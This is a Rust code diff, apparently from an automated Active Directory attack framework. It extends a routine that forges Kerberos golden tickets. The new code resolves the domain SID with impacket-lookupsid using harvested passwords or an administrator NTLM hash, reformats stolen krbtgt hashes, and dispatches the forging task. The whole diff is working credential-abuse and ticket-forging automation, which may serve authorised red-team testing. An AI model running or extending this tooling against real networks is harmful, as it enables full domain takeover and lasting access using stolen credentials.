@@ -56,16 +56,8 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             }
         };
 
-        // Require domain SID before dispatching — without it the agent
-        // would need to call get_sid which may fail if only hash creds exist.
-        let domain_sid = match state.domain_sids.get(&domain.to_lowercase()).cloned() {
-            Some(sid) => sid,
-            None => {
-                // SID not cached yet; wait for secretsdump result processing
-                drop(state);
-                continue;
-            }
-        };
+        // Domain SID: prefer cached value, resolve via lookupsid if missing.
+        let mut domain_sid = state.domain_sids.get(&domain.to_lowercase()).cloned();
 
         // Look up a DC IP for this domain
         let dc_ip = state
@@ -92,15 +84,95 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             })
             .cloned();
 
+        // Collect a password credential for SID lookup (any domain user will do)
+        let lookup_cred = state
+            .credentials
+            .iter()
+            .find(|c| {
+                c.domain.to_lowercase() == domain.to_lowercase()
+                    && !c.password.is_empty()
+                    && !state.is_credential_quarantined(&c.username, &c.domain)
+            })
+            .cloned();
+
         drop(state);
 
-        // Submit golden ticket forging task
+        // ── Resolve domain SID if not cached ────────────────────────────
+        if domain_sid.is_none() {
+            if let Some(ref target_ip) = dc_ip {
+                let result = resolve_domain_sid(
+                    &domain,
+                    target_ip,
+                    lookup_cred.as_ref(),
+                    admin_hash.as_ref(),
+                )
+                .await;
+
+                // Cache the resolved SID and admin name
+                if let Some((ref sid, ref admin_name)) = result {
+                    info!(domain = %domain, sid = %sid, admin = admin_name.as_deref().unwrap_or("Administrator"), "Domain SID resolved via lookupsid");
+                    let op_id = { dispatcher.state.read().await.operation_id.clone() };
+                    let reader = ares_core::state::RedisStateReader::new(op_id);
+                    let mut conn = dispatcher.queue.connection();
+                    if let Err(e) = reader
+                        .set_domain_sid(&mut conn, &domain.to_lowercase(), sid)
+                        .await
+                    {
+                        warn!(err = %e, "Failed to persist domain SID to Redis");
+                    }
+                    if let Some(ref name) = admin_name {
+                        if let Err(e) = reader
+                            .set_admin_name(&mut conn, &domain.to_lowercase(), name)
+                            .await
+                        {
+                            warn!(err = %e, "Failed to persist admin name to Redis");
+                        }
+                    }
+                    let mut state = dispatcher.state.write().await;
+                    state.domain_sids.insert(domain.to_lowercase(), sid.clone());
+                    if let Some(ref name) = admin_name {
+                        state
+                            .admin_names
+                            .insert(domain.to_lowercase(), name.clone());
+                    }
+                }
+
+                domain_sid = result.map(|(sid, _)| sid);
+            }
+        }
+
+        let domain_sid = match domain_sid {
+            Some(sid) => sid,
+            None => {
+                warn!(domain = %domain, "Cannot resolve domain SID — skipping golden ticket");
+                continue;
+            }
+        };
+
+        // Use cached RID-500 name, defaulting to "Administrator" when unknown.
+        let admin_username = {
+            let state = dispatcher.state.read().await;
+            state
+                .admin_names
+                .get(&domain.to_lowercase())
+                .cloned()
+                .unwrap_or_else(|| "Administrator".to_string())
+        };
+
+        // ── Build and submit golden ticket task ─────────────────────────
+        // Strip LM prefix if hash is in "lm:ntlm" format — ticketer expects
+        // a single 32-char NTLM hex string, not the LM:NTLM pair.
+        let ntlm_hash = match krbtgt.hash_value.rsplit_once(':') {
+            Some((_, ntlm)) if ntlm.len() == 32 => ntlm.to_string(),
+            _ => krbtgt.hash_value.clone(),
+        };
+
         let mut payload = json!({
             "technique": "golden_ticket",
             "vuln_type": "golden_ticket",
             "domain": domain,
-            "krbtgt_hash": krbtgt.hash_value,
-            "username": "Administrator",
+            "krbtgt_hash": ntlm_hash,
+            "username": admin_username,
             "domain_sid": domain_sid,
         });
         if let Some(ip) = dc_ip {
@@ -140,4 +212,62 @@ pub async fn auto_golden_ticket(dispatcher: Arc<Dispatcher>, mut shutdown: watch
             Err(e) => warn!(err = %e, "Failed to dispatch golden ticket"),
         }
     }
+}
+
+/// Resolve domain SID and RID-500 account name by calling `impacket-lookupsid`.
+/// Returns `(domain_sid, Option<admin_name>)`. Tries password credential first,
+/// then NTLM hash.
+async fn resolve_domain_sid(
+    domain: &str,
+    dc_ip: &str,
+    password_cred: Option<&ares_core::models::Credential>,
+    admin_hash: Option<&ares_core::models::Hash>,
+) -> Option<(String, Option<String>)> {
+    // Try password auth first
+    if let Some(cred) = password_cred {
+        let args = json!({
+            "domain": domain,
+            "username": cred.username,
+            "password": cred.password,
+            "dc_ip": dc_ip,
+        });
+        match ares_tools::privesc::get_sid(&args).await {
+            Ok(output) => {
+                let text = output.combined_raw();
+                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
+                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
+                    return Some((sid, admin_name));
+                }
+                warn!("lookupsid succeeded but no SID pattern found in output");
+            }
+            Err(e) => {
+                warn!(err = %e, user = %cred.username, "lookupsid with password failed");
+            }
+        }
+    }
+
+    // Fall back to hash auth
+    if let Some(hash) = admin_hash {
+        let args = json!({
+            "domain": domain,
+            "username": "Administrator",
+            "hash": hash.hash_value,
+            "dc_ip": dc_ip,
+        });
+        match ares_tools::privesc::get_sid(&args).await {
+            Ok(output) => {
+                let text = output.combined_raw();
+                if let Some(sid) = ares_core::parsing::extract_domain_sid(&text) {
+                    let admin_name = ares_core::parsing::extract_rid500_name(&text);
+                    return Some((sid, admin_name));
+                }
+                warn!("lookupsid (hash) succeeded but no SID pattern found");
+            }
+            Err(e) => {
+                warn!(err = %e, "lookupsid with admin hash failed");
+            }
+        }
+    }
+
+    None
 }
